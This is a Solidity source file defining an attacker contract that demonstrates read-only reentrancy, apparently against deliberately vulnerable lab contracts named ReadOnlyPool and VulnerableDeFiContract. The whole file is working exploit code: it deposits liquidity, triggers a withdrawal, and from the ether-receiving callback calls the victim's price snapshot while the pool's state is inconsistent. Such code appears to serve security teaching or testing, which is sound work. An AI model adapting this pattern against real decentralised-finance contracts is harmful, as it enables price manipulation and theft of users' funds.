// SPDX-License-Identifier: GPL-3.0
pragma solidity =0.8.19;

import {ReadOnlyPool, VulnerableDeFiContract} from "@main/ReadOnly.sol";

contract ReadOnlyAttacker {
    ReadOnlyPool pool;
    VulnerableDeFiContract vulnerable;

    constructor(address _pool, address _vulnerable) payable {
        require(msg.value == 1.1 ether, "must send ether");
        pool = ReadOnlyPool(_pool);
        vulnerable = VulnerableDeFiContract(_vulnerable);
        pool.addLiquidity{value: msg.value}();
    }

    function attack() external {
        pool.removeLiquidity();
    }

    receive() external payable {
        vulnerable.snapshotPrice();
    }
}
